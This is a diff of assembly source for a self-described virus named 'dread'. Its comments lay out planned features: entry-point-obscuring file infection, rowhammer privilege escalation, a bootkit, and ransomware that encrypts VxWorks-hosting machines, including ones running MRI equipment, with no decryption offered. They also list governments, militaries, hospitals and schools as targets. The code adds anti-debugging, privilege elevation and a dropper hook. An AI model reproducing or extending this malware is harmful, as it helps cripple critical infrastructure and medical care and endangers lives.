@@ -16,31 +16,7 @@
 ; be stealthy. Then, remove the .reloc section from the executable, so disinfection is nearly
 ; impossible.  This will be accomplished through the uep insertion.
 ; - kernel-mode driver/loader that will act as our privilege escalation w/row-hammering
-; - infects the VxWorks OS: SCADA, MRI machines, AreoSpace,  Satellites and more critical 
-; embedded devices use this RTOS. (Intel x86 processors, Intel Quark SoC, MIPS, ARM, etc..)
-;   |
-;   ---> Once it infects a computer that runs VxWorks OS it will encrypt it and
-; demand a ransom for it, the trick is: do not offer a decryption method.
-;   |
-;   ---> Lets say a computer that has Windows and is hosting VxWorks and its hooked up to an
-; MRI machine, it will encrypted the entire Windows machine, which will make it difficult 
-; for the doctors to control the MRI machine. 
-;   |
-;   ---> Infects/Encrypts PLCS: Rockwell Automation & Siemens PLCs: MrSuxme.dll --> Wiritten in C/C++
-; - will use the stoned bootkit in the future 
-;
-; - hook on to int13 and hook on to Filecrypt.sys 
-;
 ;-------------------------------------------------------(future versions end)---
-;---(targets:)------------------------------------------------------------------
-; ? Governments
-; ? Militaries
-; ? Financial Institutions
-; ? Biological Institutions 
-; ? Public/Private Sectors
-; ? Schools
-; ? ??? 
-;---------------------------------------------------------------(targets end)---
 ;-------------------------------------------------------------------------------
 ;
 ;       ....we will all enter a dreamless sleep, never to dream again.
@@ -65,10 +41,10 @@
 ; set projectname=dread
 ; \masm32\bin\ml /c /Zd /coff %projectname%.asm 
 ; \masm32\bin\Link /SUBSYSTEM:CONSOLE %projectname%.obj,,,%masm32%import32.lib,,,kernel32.lib,._cw32i.lib,,,ntdll.lib%
-; %projectname%.exe                                     <---- masm is meh, but whatever
+; %projectname%.exe    *note: do not compile with masm, since it is not that great of an assembler. 
 ;
-; going to work on this while I debug TURAGE, Etap and Nazka --> these viruses will 
-; be re-coded and debugged in fasm or masm32/64
+;
+; tuareg, etap, nazka will be compiled with tasm, after I reconstruct that assembler.
 ;
 ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -81,13 +57,6 @@ HEAP_ADD                equ     04000000h       ; 64 MB
 ;                       equ     2048000000h     ; 2048000000h = 2gb
 
 ;----------------------------------------------------------------------------
-
-includelib              masm32\._cw32i.lib
-includelib              masm32\import32.lib
-includelib              masm32\kernel32.lib
-includelib              masm32\libc.lib
-includelib              masm32\ntdll.lib
-includelib              masm32\ntoskrnl.lib
 
 include                 INCLUDEZ\apiz.asm
 include                 INCLUDEZ\cmdline.asm
@@ -121,8 +90,8 @@ include                 mem0ry\mem0ryfadeX\eloader.asm            ; encryptLoade
 ;include                 mem0ry\fadinglife\idt32.inc
 ;include                 mem0ry\fadinglife\idt64.inc
 _dead_but_dreaming:
-include                 mem0ry\Dreaming\dead.asm
-include                 mem0ry\Dreaming\sh.asm
+include                  mem0ry\Dreaming\dead.asm
+include                  mem0ry\Dreaming\sh.asm
 
 ;_fadin_to_the_void:                                                    ; this will come in the future updates, expect to see it in version 1.00, still in v.09
 ;include                 astralplane\plc_search.inc
@@ -160,7 +129,6 @@ v_mutate                dd      ?
                         jumps
                         .data       ; code starts in data section, tasm32 allows this                                               
                                     ; and we do not need to activate the write flag after assembling
-                                    ; the code. believe masm32 allows this as well
 
 ;----------------------------------------------------------------------------
 
@@ -196,7 +164,7 @@ pe_entry:
                         pushfd
                         pushad
 
-                        x_push  eax, I|shall|be|there|where|the|midnight|sun|shines....?~
+                        x_push  eax, I|shall|be|there|where|the|midnight|sun|shines....�~
                         push    esp
                         callX   WaitForDebugEventEx 
                         callX   OutputDebugStringA
@@ -223,7 +191,7 @@ pe_entry:
 
                         call    SysWow64Process             
                         call    reg_save_dread
-                        call    adjustprivs                 ; call  ElevatePrivileges+than jmps to our bootloader where out ring0 is
+                        call    adjustprivs                 ; call  ElevatePrivileges+than jmps to our bootloader where our ring0 is
 ;                        call    TryRunAsDropper
 
 __exit:
